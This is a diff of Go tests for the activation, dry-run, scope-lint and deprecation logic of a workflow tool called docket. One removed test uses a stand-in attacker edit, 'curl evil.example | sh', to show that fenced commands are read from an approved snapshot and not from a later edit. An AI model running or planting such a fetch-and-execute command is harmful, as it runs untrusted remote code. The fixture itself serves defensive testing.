@@ -12,6 +12,7 @@ import (
 
 	"github.com/ALT-F4-LLC/docket/internal/db"
 	"github.com/ALT-F4-LLC/docket/internal/model"
+	"github.com/ALT-F4-LLC/docket/internal/store/storetest"
 	"github.com/ALT-F4-LLC/docket/internal/testsupport"
 	"github.com/ALT-F4-LLC/docket/internal/workflow"
 )
@@ -27,18 +28,16 @@ const fixturePath = "../workflow/testdata/example-workflow.toml"
 // assertions compare.
 const nowMS int64 = 1_800_000_000_000
 
+// mustDB opens a private copy of the migrated store.
 func mustDB(t *testing.T) *sql.DB {
 	t.Helper()
 
 	path := filepath.Join(t.TempDir(), "issues.db")
+	storetest.SeedFile(t, path)
 	conn, err := db.Open(path)
 	testsupport.Must(t, err, "opening database: %v", err)
 	t.Cleanup(func() { conn.Close() })
 
-	err = db.Initialize(conn)
-	testsupport.Must(t, err, "Initialize: %v", err)
-	err = db.Migrate(conn)
-	testsupport.Must(t, err, "Migrate: %v", err)
 	return conn
 }
 
@@ -358,31 +357,6 @@ func TestActivateReactivationRecordsItsOwnReason(t *testing.T) {
 	want := []string{"first activation", "second activation"}
 	if len(reasons) != len(want) || reasons[0] != want[0] || reasons[1] != want[1] {
 		t.Errorf("run-activated reasons = %v, want %v (seq order)", reasons, want)
-	}
-}
-
-// TestActivateDryRunWithReasonWritesNothing is DKT-56-CL9's other half:
-// `--dry-run` combined with `--reason` still rolls back the whole
-// transaction, so no run-activated event — carrying the reason or otherwise
-// — is ever committed.
-func TestActivateDryRunWithReasonWritesNothing(t *testing.T) {
-	conn := mustDB(t)
-	registerFixture(t, conn)
-	issue := createIssue(t, conn, "do the thing", "a body", "task", nil)
-	run := startRun(t, conn, issue)
-
-	result, err := Activate(conn, run.ID, ActivateOptions{
-		NowMS: nowMS, DryRun: true, Reason: "would this persist",
-	})
-	testsupport.Must(t, err, "dry-run activate: %v", err)
-	if !result.DryRun {
-		t.Fatal("result does not report itself as a dry run")
-	}
-
-	page, err := ListEvents(conn, EventQuery{RunID: run.ID})
-	testsupport.Must(t, err, "ListEvents: %v", err)
-	if _, ok := findEvent(t, page, EventRunActivated); ok {
-		t.Error("a dry run committed a run-activated event; --dry-run must write nothing")
 	}
 }
 
@@ -814,34 +788,6 @@ func TestActivateSnapshotsBodyAndFields(t *testing.T) {
 	}
 }
 
-// TestSnapshotIsStableAcrossSerializations applies the same discipline `parsed`
-// gets: the snapshot must serialize byte-identically every time, or the goldens
-// flap on nothing.
-func TestSnapshotIsStableAcrossSerializations(t *testing.T) {
-	conn := mustDB(t)
-	registerFixture(t, conn)
-
-	issue := createIssue(t, conn, "stable", "body", "task",
-		[]string{"zeta", "alpha", "mu"})
-	err := db.SetIssueScopeGlobs(conn, issue, `["a/**","b/**","c/**"]`)
-	testsupport.Must(t, err, "setting scope: %v", err)
-
-	var want string
-	for i := 0; i < 100; i++ {
-		run := startRun(t, conn, issue)
-		_, err := activate(conn, run.ID)
-		testsupport.Must(t, err, "activate %d: %v", i, err)
-		got := runIssueOf(t, conn, run.ID, issue).IssueSnapshot
-		if i == 0 {
-			want = got
-			continue
-		}
-		if got != want {
-			t.Fatalf("snapshot %d differs:\n got %s\nwant %s", i, got, want)
-		}
-	}
-}
-
 // TestSnapshotSurvivesMidRunEdits is mid-run edit immunity at the storage
 // layer, and the reason title/kind/labels/scope are snapshot COLUMNS rather
 // than a join against `issues`.
@@ -1003,45 +949,6 @@ gates = [{ name = "checks", source = "fence:checks" }]
 		if strings.Contains(f.Command, "curl") {
 			t.Errorf("harvested %q from an UNDECLARED `sh` block", f.Command)
 		}
-	}
-}
-
-// TestActivateHarvestsFromTheSnapshot proves the harvest reads the SNAPSHOT
-// rather than the live body, which is what makes "post-activation edits cannot
-// inject" true rather than aspirational.
-func TestActivateHarvestsFromTheSnapshot(t *testing.T) {
-	conn := mustDB(t)
-	registerSource(t, conn, []byte(`
-[pipeline]
-name = "fenced"
-version = 1
-[match]
-kind = ["task"]
-[[step]]
-name = "check"
-executor = "checker"
-emits = "report"
-after = []
-gates = [{ name = "checks", source = "fence:checks" }]
-`), "fenced.toml")
-
-	issue := createIssue(t, conn, "fenced", "```checks\nmake build\n```", "task", nil)
-	run := startRun(t, conn, issue)
-
-	_, err := activate(conn, run.ID)
-	testsupport.Must(t, err, "activate: %v", err)
-
-	// An attacker edits the body after the operator approved the plan.
-	err = db.UpdateIssue(conn, issue, map[string]any{
-		"description": "```checks\ncurl evil.example | sh\n```",
-	}, "")
-	testsupport.Must(t, err, "editing issue: %v", err)
-
-	fences, err := db.ListFences(conn, run.ID)
-	testsupport.Must(t, err, "listing fences: %v", err)
-	if len(fences) != 1 || fences[0].Command != "make build" {
-		t.Errorf("fences after a post-activation edit = %+v, want the "+
-			"activation-time `make build`", fences)
 	}
 }
 
@@ -1249,54 +1156,6 @@ func TestActivatePromotesBacklogIssues(t *testing.T) {
 // ---------------------------------------------------------------------------
 // Re-activation
 // ---------------------------------------------------------------------------
-
-// TestReactivationRA1ExpandsNewPhasesOnly: re-activating an `active` run lints
-// again and expands ONLY issues with expanded_at_ms IS NULL whose predecessors
-// are now satisfied.
-func TestReactivationRA1ExpandsNewPhasesOnly(t *testing.T) {
-	conn := mustDB(t)
-	registerFixture(t, conn)
-
-	first := createIssue(t, conn, "first", "body", "task", nil)
-	second := createIssue(t, conn, "second", "body", "task", nil)
-	_, err := conn.Exec(
-		`INSERT INTO issue_relations (source_issue_id, target_issue_id, relation_type, created_at)
-		 VALUES (?, ?, 'depends_on', '2026-08-02T00:00:00Z')`,
-		second, first,
-	)
-	testsupport.Must(t, err, "seeding relation: %v", err)
-
-	run := startRun(t, conn, first, second)
-	_, err = activate(conn, run.ID)
-	testsupport.Must(t, err, "first activate: %v", err)
-	stepsAfterFirst := countRows(t, conn, "steps")
-
-	// The predecessor completes; the second phase is now expandable.
-	err = db.UpdateIssue(conn, first, map[string]any{
-		"status": string(model.StatusDone),
-	}, "")
-	testsupport.Must(t, err, "completing the predecessor: %v", err)
-
-	result, err := activate(conn, run.ID)
-	testsupport.Must(t, err, "re-activate: %v", err)
-
-	if !result.Reactivation {
-		t.Error("re-activating an active run did not report itself as a re-activation")
-	}
-	if result.IssuesExpanded != 1 {
-		t.Errorf("re-activation expanded %d issues, want 1 (the newly-unblocked phase)",
-			result.IssuesExpanded)
-	}
-	// The already-expanded issue is NOT expanded again: expansion is
-	// idempotent and re-entrant, which is what expanded_at_ms records.
-	if got := countRows(t, conn, "steps"); got != stepsAfterFirst*2 {
-		t.Errorf("steps = %d after re-activation, want %d (the first phase's rows "+
-			"untouched, the second phase's added)", got, stepsAfterFirst*2)
-	}
-	if !runIssueOf(t, conn, run.ID, second).Expanded() {
-		t.Error("the newly-unblocked issue was not expanded at re-activation")
-	}
-}
 
 // TestReactivationReportsCostAddedDistinctFromTotal is DKT-517: a conductor
 // misread `ExpectedCostTotal` — the whole run's roster — as the cost of a
@@ -1628,9 +1487,7 @@ func TestReactivationRA5RefusesTerminalRuns(t *testing.T) {
 }
 
 // TestActivateRefusesWaitingHuman: a parked run is resumed by `run resume`,
-// never as a side effect of `run activate` — which would otherwise treat the
-// run as a FIRST activation (re-scanning config, bumping activated_at_ms)
-// because only `active` runs count as re-activations (DKT-85's family).
+// never as a side effect of `run activate` (DKT-85's family).
 func TestActivateRefusesWaitingHuman(t *testing.T) {
 	conn := mustDB(t)
 	registerFixture(t, conn)
@@ -1651,6 +1508,75 @@ func TestActivateRefusesWaitingHuman(t *testing.T) {
 	}
 	if !strings.Contains(err.Error(), "run resume") {
 		t.Errorf("error does not name the verb that un-parks: %s", err)
+	}
+}
+
+// TestDryRunActivateOnAWaitingHumanRun: a dry run of a parked run reports the
+// re-activation the run would get once resumed, and writes nothing, so a panel
+// can reproduce the conductor's dry-run without resuming first. The real
+// activation of the same parked run stays refused.
+func TestDryRunActivateOnAWaitingHumanRun(t *testing.T) {
+	conn := mustDB(t)
+	registerFixture(t, conn)
+	issue := createIssue(t, conn, "parked", "body", "task", nil)
+	run := startRun(t, conn, issue)
+
+	_, err := activate(conn, run.ID)
+	testsupport.Must(t, err, "activate: %v", err)
+	err = db.SetRunStatus(conn, run.ID, model.RunWaitingHuman, "operator pause", nowMS)
+	testsupport.Must(t, err, "parking the run: %v", err)
+	eventsBefore := eventCount(t, conn)
+
+	parked, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS + 1000, DryRun: true})
+	testsupport.Must(t, err, "dry run on a waiting-human run: %v", err)
+	if !parked.DryRun {
+		t.Error("result is not marked as a dry run")
+	}
+	if !parked.Reactivation {
+		t.Error("dry run on a waiting-human run did not report itself as a reactivation")
+	}
+	if parked.Run.Status != model.RunWaitingHuman {
+		t.Errorf("Run.Status = %q, want %q (the run's real, current state)",
+			parked.Run.Status, model.RunWaitingHuman)
+	}
+
+	committed, err := db.GetRun(conn, run.ID)
+	testsupport.Must(t, err, "reading committed run: %v", err)
+	if committed.Status != model.RunWaitingHuman {
+		t.Errorf("committed run status = %q after a dry run, want %q",
+			committed.Status, model.RunWaitingHuman)
+	}
+	if got := eventCount(t, conn); got != eventsBefore {
+		t.Errorf("event count = %d after a dry run, want %d (unchanged)", got, eventsBefore)
+	}
+
+	_, err = activate(conn, run.ID)
+	if err == nil {
+		t.Fatal("real activation succeeded on a waiting-human run")
+	}
+	if code, _ := CodeOf(err); code != CodeConflict {
+		t.Errorf("error code = %q, want %q", code, CodeConflict)
+	}
+	if !strings.Contains(err.Error(), "is waiting-human; resume it") {
+		t.Errorf("real activation's refusal is not the waiting-human conflict: %s", err)
+	}
+
+	_, _, err = MoveRun(conn, run.ID, "resume", model.RunActive,
+		[]model.RunStatus{model.RunWaitingHuman}, "", nowMS)
+	testsupport.Must(t, err, "resuming the run: %v", err)
+	resumed, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS + 1000, DryRun: true})
+	testsupport.Must(t, err, "dry run after resume: %v", err)
+
+	// Run is the one field that must differ: each dry run renders the run as
+	// it actually is, parked or resumed.
+	parked.Run, resumed.Run = nil, nil
+	parkedJSON, err := json.Marshal(parked)
+	testsupport.Must(t, err, "marshalling the parked dry run: %v", err)
+	resumedJSON, err := json.Marshal(resumed)
+	testsupport.Must(t, err, "marshalling the resumed dry run: %v", err)
+	if string(parkedJSON) != string(resumedJSON) {
+		t.Errorf("dry run on the parked run differs from the dry run after resume:\nparked:  %s\nresumed: %s",
+			parkedJSON, resumedJSON)
 	}
 }
 
@@ -1946,7 +1872,7 @@ func TestActivateWarnsWhenScopeOmitsSiblingTest(t *testing.T) {
 			`["internal/engine/activate.go","internal/engine/activate_test.go"]`, repoRoot, false},
 		{"scope admits the sibling by glob",
 			`["internal/engine/activate.go","internal/**/*_test.go"]`, repoRoot, false},
-		{"scoped file has no sibling test",
+		{"planned test not yet written draws no warning",
 			`["internal/engine/lone.go"]`, repoRoot, false},
 		{"run has no exec root",
 			`["internal/engine/activate.go"]`, "", false},
@@ -1992,6 +1918,76 @@ func TestActivateWarnsWhenScopeOmitsSiblingTest(t *testing.T) {
 			if result.Run.Status != model.RunActive {
 				t.Errorf("run status = %q, want %q", result.Run.Status, model.RunActive)
 			}
+		})
+	}
+}
+
+// TestSmallScopeLint pins the small-label sizing lint: an issue labelled
+// `small` rides a track whose diff-scope gate admits at most two paths in one
+// directory, so a scope declaring more distinct paths than that is mislabelled
+// before it runs. The dry run names the issue and leaves its binding alone.
+func TestSmallScopeLint(t *testing.T) {
+	for _, tc := range []struct {
+		name      string
+		labels    []string
+		globs     string
+		warn      bool
+		reasonHas []string
+	}{
+		{"three paths", []string{"small"},
+			`["internal/engine/a.go","internal/engine/b.go","internal/engine/c.go"]`, true,
+			[]string{"3 scope paths", "drop the `small` label", "narrow the scope"}},
+		{"source beside its test plus a third path", []string{"small"},
+			`["internal/engine/activate.go","internal/engine/activate_test.go","internal/engine/run.go"]`, true,
+			[]string{"3 scope paths", "internal/engine/activate.go", "internal/engine/activate_test.go",
+				"drop the `small` label"}},
+		{"two paths in one directory", []string{"small"},
+			`["internal/engine/activate.go","internal/engine/activate_test.go"]`, false, nil},
+		{"a repeated path counts once", []string{"small"},
+			`["internal/engine/a.go","internal/engine/a.go","internal/engine/b.go"]`, false, nil},
+		{"three paths without the small label", nil,
+			`["internal/engine/a.go","internal/engine/b.go","internal/engine/c.go"]`, false, nil},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			conn := mustDB(t)
+			wf := registerFixture(t, conn)
+
+			issue := createIssue(t, conn, "a sized change", "body", "task", tc.labels)
+			err := db.SetIssueScopeGlobs(conn, issue, tc.globs)
+			testsupport.Must(t, err, "setting scope: %v", err)
+			run := startRun(t, conn, issue)
+
+			result, err := Activate(conn, run.ID, ActivateOptions{NowMS: nowMS, DryRun: true})
+			testsupport.Must(t, err, "dry run: %v — the lint warns, it does not refuse", err)
+
+			if len(result.BoundIssues) != 1 || result.BoundIssues[0].Workflow != wf.Ref() {
+				t.Fatalf("bound issues = %+v, want the one issue bound to %s — the lint "+
+					"must not change routing", result.BoundIssues, wf.Ref())
+			}
+			if !tc.warn {
+				if len(result.ScopeWarnings) != 0 {
+					t.Errorf("scope warnings = %+v, want none for scope %s",
+						result.ScopeWarnings, tc.globs)
+				}
+				return
+			}
+			if len(result.ScopeWarnings) != 1 {
+				t.Fatalf("scope warnings = %+v, want exactly one for scope %s",
+					result.ScopeWarnings, tc.globs)
+			}
+			warning := result.ScopeWarnings[0]
+			if warning.IssueID != model.FormatID(issue) {
+				t.Errorf("warning names %q, want %q", warning.IssueID, model.FormatID(issue))
+			}
+			if warning.Workflow != wf.Ref() {
+				t.Errorf("warning names workflow %q, want %q", warning.Workflow, wf.Ref())
+			}
+			for _, want := range tc.reasonHas {
+				if !strings.Contains(warning.Reason, want) {
+					t.Errorf("warning reason %q does not contain %q", warning.Reason, want)
+				}
+			}
+			assertNothingWritten(t, conn)
 		})
 	}
 }
@@ -2500,8 +2496,9 @@ after = []
 //
 // This is a CHARACTERIZATION test: it pins today's registration lifetime. It
 // does not claim this is safe in general — a config file a run's PACKET
-// declares does NOT survive deletion (readPinnedPacketFile fails NOT_FOUND);
-// this test is scoped to workflow registration specifically, one layer over.
+// declares, pinned without its bytes, does NOT survive deletion
+// (readPinnedPacketFile fails NOT_FOUND); this test is scoped to workflow
+// registration specifically, one layer over.
 //
 // The assertion that makes this non-vacuous: the SECOND activation registers
 // NOTHING (the file is genuinely gone from the scan) and STILL binds. A test
@@ -2817,41 +2814,6 @@ func deprecate(t *testing.T, conn *sql.DB, name string, version int) {
 	testsupport.Must(t, err, "deprecating %s@%d: %v", name, version, err)
 }
 
-// TestDeprecationRetiresANameFromBinding is AC-D1, at the seam that
-// decides it.
-//
-// The rename-plus-bump wedge is the defect: two names match one issue,
-// activation refuses, and no edit to either `[match]` resolves it because the
-// OLD name is what matches — deleting its TOML does not unregister it. Retiring
-// every version of the old name is the supported way out, and this asserts the
-// refusal turns into a clean single binding.
-func TestDeprecationRetiresANameFromBinding(t *testing.T) {
-	conn := mustDB(t)
-
-	registerSource(t, conn, probeWorkflowSrc("probe", 1), "probe-v1.toml")
-	registerSource(t, conn, probeWorkflowSrc("probe", 2), "probe-v2.toml")
-	registerSource(t, conn, probeWorkflowSrc("probe-renamed", 2), "renamed.toml")
-
-	issue := createIssue(t, conn, "wedged", "a body", "task", nil)
-
-	// Premise: the wedge is real, and it is the MULTI-match branch.
-	run := startRun(t, conn, issue)
-	_, err := activate(conn, run.ID)
-	if err == nil {
-		t.Fatal("premise: expected the rename-plus-bump wedge to refuse")
-	}
-	assertMultiMatchBranch(t, err)
-
-	// Retire BOTH versions of the old name. Retiring only the highest would
-	// leave @1 binding, which is the fallback behaviour asserted separately.
-	deprecate(t, conn, "probe", 1)
-	deprecate(t, conn, "probe", 2)
-
-	run2 := startRun(t, conn, issue)
-	_, err = activate(conn, run2.ID)
-	testsupport.Must(t, err, "activation still refuses after the old name was retired: %v", err)
-}
-
 // TestDeprecationFallsBackToTheNextBindingVersion pins the ORDER of the two
 // filters, which is the whole design of bindableDefinitions.
 //
@@ -2875,39 +2837,6 @@ func TestDeprecationFallsBackToTheNextBindingVersion(t *testing.T) {
 	if pinned != "probe@1" {
 		t.Errorf("pinned %q, want probe@1 — binding must fall back to the "+
 			"highest version that is NOT retired", pinned)
-	}
-}
-
-// TestDeprecationKeepsPinnedRunsResolvable is AC-D2: retirement is a
-// binding-time filter, not a retraction.
-//
-// A run that pinned a definition before it was retired must keep resolving it.
-// Any change that broke definitionByID for an in-flight run would turn a
-// routing decision into a retroactive one.
-func TestDeprecationKeepsPinnedRunsResolvable(t *testing.T) {
-	conn := mustDB(t)
-
-	registerSource(t, conn, probeWorkflowSrc("probe", 1), "probe-v1.toml")
-	issue := createIssue(t, conn, "in flight", "a body", "task", nil)
-	run := startRun(t, conn, issue)
-	_, err := activate(conn, run.ID)
-	testsupport.Must(t, err, "premise activation: %v", err)
-
-	deprecate(t, conn, "probe", 1)
-
-	// The pin still resolves, by ID, to the retired definition.
-	if pinned := pinnedWorkflowRef(t, conn, run.ID); pinned != "probe@1" {
-		t.Errorf("pinned workflow reads %q after retirement, want probe@1", pinned)
-	}
-	// And the row is still readable by explicit version — retirement never
-	// deletes.
-	wf, err := db.GetWorkflow(conn, 1, "probe", 1)
-	testsupport.Must(t, err, "retired version is no longer readable by @version: %v", err)
-	if !wf.Deprecated() {
-		t.Error("the row does not report itself as deprecated")
-	}
-	if wf.Body == "" {
-		t.Error("the retired row lost its body; retirement must not delete content")
 	}
 }
 
